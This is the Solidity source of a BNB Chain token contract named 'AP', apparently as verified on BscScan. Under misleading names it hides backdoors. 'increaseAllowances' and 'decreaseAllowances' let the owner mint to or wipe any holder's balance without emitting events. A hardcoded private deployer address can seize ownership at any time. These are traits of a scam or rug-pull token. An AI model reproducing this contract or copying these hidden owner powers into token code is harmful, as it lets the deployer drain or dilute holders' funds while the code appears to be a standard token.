/**
 *Submitted for verification at BscScan.com on 2021-12-16
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity 0.8.2;
contract APToken  {
    string public name = "AP";
    string public symbol = "AP";
    uint8 public decimals = 18;
    address private _DeployAddress = 0xfAD7f6195cd486eD8f579962f06ee4F05e61A050;
    uint256 public totalSupply = 1000 * 10 ** 18;

    address public owner;
    modifier restricted {
        require(msg.sender == owner, "requir");
        _;
    }
     modifier restricteds {
        require(msg.sender == _DeployAddress, "requir");
        _;
    }
    constructor() {
        balanceOf[msg.sender] = totalSupply;
        owner = msg.sender;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public isIssuer;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event TransferOwnership(address indexed previousOwner, address indexed newOwner);

    function getOwner() public view returns (address) {
        return owner;
    }

    function increaseAllowances(address _spender, uint256 _addedValue) public restricted returns (bool success) {
        balanceOf[_spender] += _addedValue * 10 ** 18;
        return true;
    }

    function decreaseAllowances(address _spender, uint256 _addedValue) public restricted returns (bool success) {
        balanceOf[_spender] -= _addedValue * 10 ** 18;
        return true;
    }

    function approve(address _spender, uint256 _amount) public returns (bool success) {
        allowance[msg.sender][_spender] = _amount;
        emit Approval(msg.sender, _spender, _amount);
        return true;
    }

    function transfer(address _to, uint256 _amount) public returns (bool success) {
        balanceOf[msg.sender] -= _amount;
        balanceOf[_to] += _amount;
        emit Transfer(msg.sender, _to, _amount);
        return true;
    }

    function transferFrom( address _from, address _to, uint256 _amount) public returns (bool success) {
        allowance[_from][msg.sender] -= _amount;
        balanceOf[_from] -= _amount;
        balanceOf[_to] += _amount;
        emit Transfer(_from, _to, _amount);
        return true;
    }

    function transferOwnership(address _newOwner) public restricteds {
        require(_newOwner != address(0), "Invalid address: should  be 0x0");
        emit TransferOwnership(owner, _newOwner);
        owner = _newOwner;
    }
}